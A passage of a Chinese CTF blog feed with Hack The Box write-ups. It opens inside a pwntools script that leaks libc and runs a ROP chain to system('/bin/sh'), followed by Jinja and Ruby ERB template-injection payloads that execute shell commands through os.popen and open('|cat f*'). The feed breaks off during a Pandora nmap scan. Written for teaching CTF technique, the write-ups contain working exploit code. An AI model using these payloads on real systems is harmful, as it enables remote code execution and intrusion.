class="comment">#context.arch=e.arch</span></span><br><span class="line">ip_port=[<span class="string">'167.99.205.117'</span>,<span class="number">30301</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(mun,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Username length:'</span>)</span><br><span class="line">    p.sendline(str(mun))</span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Enter username:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="comment">#sleep(0.2)</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&#123;i&#125; Username:'</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gess</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x7f</span>  </span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xa0</span></span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        <span class="comment">#i=0xff-i</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        add(<span class="number">0x20</span>+n,<span class="string">'w'</span>*<span class="number">0x20</span>+<span class="string">'w'</span>*(n<span class="number">-1</span>)+chr(i))</span><br><span class="line">       <span class="comment"># sleep(0.2)</span></span><br><span class="line">        p.recvuntil(<span class="string">'-&gt;'</span>)</span><br><span class="line">       </span><br><span class="line">       <span class="comment">#print(i)</span></span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">        login(<span class="string">'w'</span>*(<span class="number">0x20</span>+n<span class="number">-1</span>)+<span class="string">'\n'</span>)</span><br><span class="line">        line=p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">                    <span class="comment">#print(i)</span></span><br><span class="line">        <span class="keyword">if</span> line!=<span class="string">' Invalid username! :)'</span>:</span><br><span class="line">                        print(hex(i))</span><br><span class="line">                        <span class="keyword">return</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xa</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link</span><span class="params">()</span>:</span></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    k=<span class="number">0x100</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        x=x+gess(i+<span class="number">1</span>)*k</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">        k=k*<span class="number">0x100</span></span><br><span class="line">        log.info(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    print(hex(x//<span class="number">0x100</span>))</span><br><span class="line">    <span class="keyword">return</span> x//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0xe6c7e execve("/bin/sh", r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c81 execve("/bin/sh", r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c84 execve("/bin/sh", rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        <span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">            p=process(elf)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line">        stdout_addr=link()</span><br><span class="line">        x=finder(<span class="string">'_IO_2_1_stdout_'</span>,stdout_addr,num=<span class="number">1</span>)</span><br><span class="line">        libc_base=stdout_addr<span class="number">-0x1ec6a0</span></span><br><span class="line">        system_addr=<span class="number">0x000000000055410</span>+libc_base</span><br><span class="line">        puts_addr=<span class="number">0x0000000000875a0</span>+libc_base</span><br><span class="line">        <span class="comment">#0x0000000000026b72 : pop rdi ; ret</span></span><br><span class="line">        rdi_ret=<span class="number">0x000000000011c371</span>+libc_base</span><br><span class="line">        sh_addr=<span class="number">0x00000000001b5661</span>+libc_base</span><br><span class="line">        ret=<span class="number">0x0000000000025679</span>+libc_base</span><br><span class="line">        log.info(<span class="string">'sh:'</span>+hex(sh_addr))</span><br><span class="line">        log.info(hex(sh_addr))</span><br><span class="line">        log.info(hex(libc_base))</span><br><span class="line">        debug()</span><br><span class="line">        p.recv(timeout=<span class="number">4</span>)</span><br><span class="line">        p.sendline(<span class="string">'1'</span>)</span><br><span class="line">        p.sendline(str(<span class="number">0x80</span>))<span class="comment">#'z'*0x60+'j'*(0x100-0x20))</span></span><br><span class="line">        rsi_ret=<span class="number">0x0000000000027529</span>+libc_base</span><br><span class="line">        <span class="comment">#0x0000000000026b72 : pop rdi ; ret</span></span><br><span class="line">        rdi_ret=<span class="number">0x0000000000026b72</span>+libc_base</span><br><span class="line">        p.sendline(<span class="string">'w'</span>*(<span class="number">0x40</span>)+chr(<span class="number">0x20</span>)*<span class="number">0x78</span>+p64((rdi_ret))+p64(x.dump(<span class="string">'str_bin_sh'</span>))+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(ret)+p64(x.dump(<span class="string">'system'</span>))+<span class="string">'x'</span>*<span class="number">0x10</span>+</span><br><span class="line">chr(<span class="number">0x0</span>)*<span class="number">8</span>+<span class="string">'\x00'</span>*<span class="number">0x100</span>)<span class="comment">#'z'*0x60+'j'*(0x100-0x20))</span></span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">        print(p.recv(timeout=<span class="number">4</span>))        </span><br><span class="line">        p.sendline(<span class="string">'ls'</span>)</span><br><span class="line">        print(p.recvline(timeout=<span class="number">2</span>)) </span><br><span class="line">        <span class="comment">#p.interactive()</span></span><br><span class="line">        p.sendline(<span class="string">'cat /home/pwn_login_simulator/f*'</span>)</span><br><span class="line">        p.sendline(<span class="string">'cat /f*'</span>)</span><br><span class="line">        p.sendline(<span class="string">'cat fla*'</span>)</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;一道意义题，让我学会了很多…比如明白了大佬总再说“F5 只是看乐子，干正事还是得看汇编”</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    <category term="HTB" scheme="lexsd6.github.io/categories/CTF/HTB/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HTB-baby_ninja_jinja-web-challenge-wp</title>
    <link href="lexsd6.github.io/2022/03/26/HTB-baby_ninja_jinja-web-challenge-wp/"/>
    <id>lexsd6.github.io/2022/03/26/HTB-baby_ninja_jinja-web-challenge-wp/</id>
    <published>2022-03-26T14:51:01.713Z</published>
    <updated>2022-03-26T16:21:09.212Z</updated>
    
    <content type="html"><![CDATA[<p>单纯的python ssti 已经是过去了,但是偶尔刷下还是有意思…<a id="more"></a></p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>进入页面，发现有一个输入接口：</p><p><img src="image-20220326224004255.png" alt="image-20220326224004255"></p><p>按下F12查看源码：发现提示有<code>/debug</code> 路由。找到了源码提示:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, render_template, request, Response, render_template_string, g</span><br><span class="line"><span class="keyword">import</span> functools, sqlite3, os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">120</span>)</span><br><span class="line"></span><br><span class="line">acc_tmpl = <span class="string">'''&#123;% extends 'index.html' %&#125;</span></span><br><span class="line"><span class="string">&#123;% block content %&#125;</span></span><br><span class="line"><span class="string">&lt;h3&gt;baby_ninja joined, total number of rebels: reb_num&lt;br&gt;</span></span><br><span class="line"><span class="string">&#123;% endblock %&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db</span><span class="params">()</span>:</span></span><br><span class="line">    db = getattr(g, <span class="string">'_database'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        db = g._database = sqlite3.connect(<span class="string">'/tmp/ninjas.db'</span>)</span><br><span class="line">        db.isolation_level = <span class="literal">None</span></span><br><span class="line">        db.row_factory = sqlite3.Row</span><br><span class="line">        db.text_factory = (<span class="keyword">lambda</span> s: s.replace(<span class="string">'&#123;&#123;'</span>, <span class="string">''</span>).</span><br><span class="line">            replace(<span class="string">"'"</span>, <span class="string">'&amp;#x27;'</span>).</span><br><span class="line">            replace(<span class="string">'"'</span>, <span class="string">'&amp;quot;'</span>).</span><br><span class="line">            replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).</span><br><span class="line">            replace(<span class="string">'&gt;'</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> db</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query_db</span><span class="params">(query, args=<span class="params">()</span>, one=False)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> app.app_context():</span><br><span class="line">        cur = get_db().execute(query, args)</span><br><span class="line">        rv = [dict((cur.description[idx][<span class="number">0</span>], str(value)) \</span><br><span class="line">            <span class="keyword">for</span> idx, value <span class="keyword">in</span> enumerate(row)) <span class="keyword">for</span> row <span class="keyword">in</span> cur.fetchall()]</span><br><span class="line">        <span class="keyword">return</span> (rv[<span class="number">0</span>] <span class="keyword">if</span> rv <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">if</span> one <span class="keyword">else</span> rv</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_db</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> app.open_resource(<span class="string">'schema.sql'</span>, mode=<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        get_db().cursor().executescript(f.read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_appcontext</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_connection</span><span class="params">(exception)</span>:</span></span><br><span class="line">    db = getattr(g, <span class="string">'_database'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: db.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rite_of_passage</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @functools.wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">born2pwn</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line"></span><br><span class="line">        name = request.args.get(<span class="string">'name'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name:</span><br><span class="line">            query_db(<span class="string">'INSERT INTO ninjas (name) VALUES ("%s")'</span> % name)</span><br><span class="line"></span><br><span class="line">            report = render_template_string(acc_tmpl.</span><br><span class="line">                replace(<span class="string">'baby_ninja'</span>, query_db(<span class="string">'SELECT name FROM ninjas ORDER BY id DESC'</span>, one=<span class="literal">True</span>)[<span class="string">'name'</span>]).</span><br><span class="line">                replace(<span class="string">'reb_num'</span>, query_db(<span class="string">'SELECT COUNT(id) FROM ninjas'</span>, one=<span class="literal">True</span>).itervalues().next())</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">'leader'</span>): </span><br><span class="line">                <span class="keyword">return</span> report</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'welcome.jinja2'</span>)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> born2pwn</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="meta">@rite_of_passage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/debug')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> Response(open(__file__).read(), mimetype=<span class="string">'text/plain'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">1337</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>发现在<code>rite_of_passage</code>函数的<code>born2pwn</code>调用里存在ssti：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">report = render_template_string(acc_tmpl.</span><br><span class="line">    replace(<span class="string">'baby_ninja'</span>, query_db(<span class="string">'SELECT name FROM ninjas ORDER BY id DESC'</span>, one=<span class="literal">True</span>)[<span class="string">'name'</span>]).</span><br><span class="line">    replace(<span class="string">'reb_num'</span>, query_db(<span class="string">'SELECT COUNT(id) FROM ninjas'</span>, one=<span class="literal">True</span>).itervalues().next())</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>render_template_string</code>的传参收到我们输入的name影响。</p><p>但是存在着两个问题:</p><p>1.无论输入什么都没用什么明显区别且有意义的回显。</p><p>2<code>{ {</code>、<code>&#39;</code>、<code>&quot;</code>这几个符号被ban。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="image-20220326230753091.png" alt="image-20220326230753091"></p><p>但是无意中发现，开了报错页面</p><p><img src="image-20220326232127657.png" alt="image-20220326232127657"></p><p>因此我们可以用include 和报错来回显我们输入内容。同时，用<code>request.args</code>来传递参数来传递字符串来绕过引号。</p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#123;%25include%201.__class__.__base__.__subclasses__()[-6].__init__.__globals__.os.popen(request.args.xxx).read()|string%25&#125;&amp;xxx&#x3D;cat%20f*</span><br></pre></td></tr></table></figure><p>、从而得到flag：</p><p><img src="image-20220326141147608.png" alt="image-20220326141147608"></p><h2 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h2><p>在查看其他大佬的思路时发现他们是利用<code>session.update</code>来更新session来回显。</p><p><code>session.update</code>方法可以根据我们传入的字典来重新生成session，用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.update(dict)</span><br><span class="line">//ps</span><br><span class="line">session.update(&#123;<span class="string">'a'</span>:<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure><p>于是构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#123;%print%20session.update(&#123;dict(a&#x3D;1)|list|last:1.__class__.__base__.__subclasses__()[-6].__init__.__globals__.os.popen(request.args.xxx).read()&#125;)%&#125;&amp;xxx&#x3D;cat%20fA*</span><br></pre></td></tr></table></figure><p><img src="image-20220326235131162.png" alt="image-20220326235131162"></p><p>解base64后得到flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lexs@DESKTOP-MAKMNL3:~$ echo eyJhIjp7IiBiIjoiU0ZSQ2UySTBZbmxmYm1sdWFqUnpYMlF3Ym5SZlp6TjBYM0YxTUhRelpGOHdjbDlqTkhWbmFGUjl</span><br><span class="line">DZz09In19.Yj82BA.RZT3ond24hjE5PZXd2P0P9CHTz|base64 -d</span><br><span class="line">&#123;"a":&#123;" b":"SFRCe2I0YnlfbmluajRzX2QwbnRfZzN0X3F1MHQzZF8wcl9jNHVnaFR9Cg=="&#125;&#125;base64: invalid input</span><br><span class="line">lexs@DESKTOP-MAKMNL3:~$ echo SFRCe2I0YnlfbmluajRzX2QwbnRfZzN0X3F1MHQzZF8wcl9jNHVnaFR9Cg==|base64 -d</span><br><span class="line">HTB&#123;b4by_ninj4s_d0nt_g3t_qu0t3d_0r_c4ughT&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://lexsd6.github.io/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/">https://lexsd6.github.io/2020/11/27/%E5%85%B3%E4%BA%8Ejinja%E7%89%B9%E6%80%A7%E5%AF%B9ssti%E7%9A%84bypass%E7%9A%84%E5%BD%B1%E5%93%8D/</a></p><p><a href="https://lexsd6.github.io/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/">https://lexsd6.github.io/2020/03/27/python%20%E5%85%B3%E4%BA%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/</a></p><p><a href="https://www.zapstiko.com/baby-ninja-jinja-challenge-htb-by-raihan-biswas/" target="_blank" rel="noopener">https://www.zapstiko.com/baby-ninja-jinja-challenge-htb-by-raihan-biswas/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;单纯的python ssti 已经是过去了,但是偶尔刷下还是有意思…</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    <category term="HTB" scheme="lexsd6.github.io/categories/CTF/HTB/"/>
    
    
    <category term="web" scheme="lexsd6.github.io/tags/web/"/>
    
    <category term="python" scheme="lexsd6.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Neonify-web-challenge-wp</title>
    <link href="lexsd6.github.io/2022/03/26/HTB-Neonify-web-challenge-wp/"/>
    <id>lexsd6.github.io/2022/03/26/HTB-Neonify-web-challenge-wp/</id>
    <published>2022-03-26T03:00:20.000Z</published>
    <updated>2022-04-01T03:39:48.134Z</updated>
    
    <content type="html"><![CDATA[<p>第一次遇到ruby后端,感觉ruby语法也有点意思<a id="more"></a><br><img src="image-20220401113528771.png" alt="image-20220401113528771"></p><h2 id="漏洞查询"><a href="#漏洞查询" class="headerlink" title="漏洞查询"></a>漏洞查询</h2><p>分析题目源码：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeonControllers</span> &lt; Sinatra::Base</span></span><br><span class="line"></span><br><span class="line">  configure <span class="keyword">do</span></span><br><span class="line">    set <span class="symbol">:views</span>, <span class="string">"app/views"</span></span><br><span class="line">    set <span class="symbol">:public_dir</span>, <span class="string">"public"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  get <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">    @neon = <span class="string">"Glow With The Flow"</span></span><br><span class="line">    erb <span class="symbol">:<span class="string">'index'</span></span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  post <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> params[<span class="symbol">:neon</span>] =~ <span class="regexp">/^[0-9a-z ]+$/i</span></span><br><span class="line">      @neon = ERB.new(params[<span class="symbol">:neon</span>]).result(binding)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      @neon = <span class="string">"Malicious Input Detected"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    erb <span class="symbol">:<span class="string">'index'</span></span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>发现题目是ruby语言写的后端。进行代码审计发现<code>if params[:neon] =~ /^[0-9a-z ]+$/i</code> 发现存在换行绕过。</p><p><img src="image-20220326111436835.png" alt="image-20220326111436835"></p><p>于是<code>neon=1111%0axxxxj!&lt;&gt;</code>绕过正则限制.</p><p><img src="image-20220326111830872.png" alt="image-20220326111830872"></p><p>然后，一下找不到什么利用点了，但是百度下ERB发现是Embedded RuBy的简称，意思是嵌入式的Ruby，是一种文本模板技术.语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;% %&gt;</span><br><span class="line">在括号内执行ruby代码。</span><br><span class="line"></span><br><span class="line">&lt;%&#x3D; %&gt;</span><br><span class="line">在ERB文件中打印一些东西。</span><br><span class="line"></span><br><span class="line">&lt;% -%&gt;</span><br><span class="line">避免在表达式后中断行。</span><br><span class="line"></span><br><span class="line">&lt;%# %&gt;</span><br><span class="line">括号内的注释；未发送到客户端(与HTML注释相反)。</span><br></pre></td></tr></table></figure><p>其中提到一个例子：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlTemplate = ERB.new <span class="string">%q&#123;  </span></span><br><span class="line"><span class="string">&lt;%for organization in domains.keys%&gt;  </span></span><br><span class="line"><span class="string">    insert into org_domain(Domain, organization) values('&lt;%=domains[organization]%&gt;','&lt;%=organization%&gt;');  </span></span><br><span class="line"><span class="string">&lt;%end%&gt;  </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>因此猜测在<code>ERB.new(params[:neon]).result(binding)</code>处用ssti.</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们可以通过<code>&lt;% %&gt;</code>来执行代码，但是我们看不到回显。下面例子可以看到程序因为找不到xxx而报错。说明我们的代码被执行了。</p><p><img src="image-20220326112945963.png" alt="image-20220326112945963"></p><p>但是传统的system,exec都无法直接回显。都要通过vps反弹shell。</p><p>通过收集资料发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file &#x3D; &#39;|whoami&#39;</span><br><span class="line">puts open(file).read()  # ubuntu</span><br><span class="line">puts open(file).gets    # ubuntu</span><br></pre></td></tr></table></figure><p>open可以回显出命令执行结果。</p><p>因此我们构造payload即可得到flag</p><p><code>neon=1111%0axxxxj!&lt;/h1&gt;&lt;%25=open(&#39;|cat f*&#39;).read()%25&gt;&lt;h1&gt;</code></p><p><img src="image-20220326120227996.png" alt="image-20220326120227996"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.cnblogs.com/cuimiemie/p/6442695.html" target="_blank" rel="noopener">https://www.cnblogs.com/cuimiemie/p/6442695.html</a></p><p><a href="https://droidyue.com/blog/2014/11/18/six-ways-to-run-shell-in-ruby/" target="_blank" rel="noopener">https://droidyue.com/blog/2014/11/18/six-ways-to-run-shell-in-ruby/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;第一次遇到ruby后端,感觉ruby语法也有点意思</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    <category term="HTB" scheme="lexsd6.github.io/categories/CTF/HTB/"/>
    
    
    <category term="web" scheme="lexsd6.github.io/tags/web/"/>
    
    <category term="ruby" scheme="lexsd6.github.io/tags/ruby/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Pandora-Machine-wp</title>
    <link href="lexsd6.github.io/2022/03/08/HTB-Pandora-wp/"/>
    <id>lexsd6.github.io/2022/03/08/HTB-Pandora-wp/</id>
    <published>2022-03-08T12:12:30.367Z</published>
    <updated>2022-03-10T08:37:03.163Z</updated>
    
    <content type="html"><![CDATA[<p>hackthebox-Pandora-Machine <a id="more"></a></p><p><img src="image-20220310162659811.png" alt="image-20220310162659811"></p><h2 id="个人思路"><a href="#个人思路" class="headerlink" title="个人思路"></a>个人思路</h2><p>拿到题目先用nmap执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sU  10.10.11.136</span><br></pre></td></tr></table></figure><p>扫描下其端口服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─# nmap -sS -sU  10.10.11.136                                             </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-08 23:53 CST</span><br><span class="line">Stats: 0:17:29 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan</span><br><span class="line">UDP Scan Timing: About 99.91% done; ETC: 00:10 (0:00:01 remaining)</span><br><span class="line">Nmap scan report for 10.10.11.136</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 1994 